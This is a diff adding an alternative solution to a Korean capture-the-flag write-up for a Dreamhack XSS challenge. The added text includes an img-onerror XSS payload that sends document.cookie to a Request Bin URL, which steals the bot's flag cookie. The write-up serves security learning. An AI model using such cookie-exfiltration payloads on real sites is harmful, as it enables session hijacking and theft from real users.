@@ -3,6 +3,45 @@
 ![1](https://user-images.githubusercontent.com/73854324/158143422-bb2f57fa-da04-4175-badb-b72320312bfe.png)
 <br>
 ==
+문제를 풀어보고 나니, 다른 방법이 생각나서 추가한다.   
+밑으로 쭉쭉 내려서 처음에 푼 방법을 먼저 보면 이해가 더 잘 된다.   
+<br><br>
+![1](https://user-images.githubusercontent.com/73854324/158157258-6ca79698-05c7-4ddf-8682-8f3f38e8b651.png)<br>
+코드를 보면, 우리는 먼저 flag 페이지에 POST 방식으로 요청을 보낸다.   
+그 후 check_xss 함수가 실행된다. (뒤 코드를 보면 결과를 알겠지만, 쿠키 값이 없다면 wrong?? 이 뜰 것이다.)   
+![2](https://user-images.githubusercontent.com/73854324/158157261-40fe18a6-5f29-481a-9b29-9d59aa61071c.png)<br>
+check_xss 함수의 내용은 이러하다.(하단)   
+입력받은 파라미터와 쿠키값을 가지고, read_url 함수를 통해서 flag 값을 가진 봇이 링크에 접속한다.   
+read_url 함수에서는 웹드라이버를 통해서 flag 값을 쿠키로 가진 채 해당 url에 접속하게 된다.<br>
+## 그렇다면, 봇이 쿠키값을 가진 채 접속하게만 하고 요청 헤더의 쿠키값만 확인하면 된다.   
+<br>
+dreamhack 사이트 내에는, 여러 툴들이 존재한다. 
+<br><br>  
+![0](https://user-images.githubusercontent.com/73854324/158157253-84b4ea82-9f9a-4c46-8ed8-262b75b1cc55.png)<br>
+https://tools.dreamhack.games/main   
+해당 링크 내 Request Bin 은, 임의로 웹서버를 만든 것처럼 가상으로 방문자들의 정보를 알 수 있다.   
+이 웹서버로 봇이 쿠키값을 가지고 접속하게만 하면 된다.   
+실전으로 옮겨보았다.   
+<br><br>
+![3](https://user-images.githubusercontent.com/73854324/158157265-09b9806a-d126-4797-87d3-c5da739aac5c.png)<br>
+할당받은 url은 https://qwtdbvz.request.dreamhack.games 이다.   
+```
+https://qwtdbvz.request.dreamhack.games?document.cookie
+```
+이 곳으로 접속하면, 쿠키값을 가진채로 그냥 봇이 접속 할 것 같다.   
+vuln 페이지에서 xss 공격을 하기 위해서는 img 태그를 사용했었다.   
+![4](https://user-images.githubusercontent.com/73854324/158157266-0a9455a1-546c-495e-a932-baa8d02926c3.png)<br>
+```
+<img src="/" onerror="location.href='https://qwtdbvz.request.dreamhack.games?'+document.cookie">
+```
+
+바로 주입시켜보았다.   
+<br><br>
+![5](https://user-images.githubusercontent.com/73854324/158157269-8eec9af3-e3c1-4374-bd93-f78c7ac9aa57.png)<br>
+요청 값으로 쿠키가 들어있다.   
+<br><br><br><br><br><br>
+처음에 푼 방법
+==
 ![2](https://user-images.githubusercontent.com/73854324/158143428-737e818b-03ad-464e-aa1e-a697459697fa.png)<br>
 메인페이지는 뭐.. xss-1 이랑 다를 바 없었다.   
 (심지어 XSS-2 문제인데도, XSS-1 이라 적힌 것 까지)   
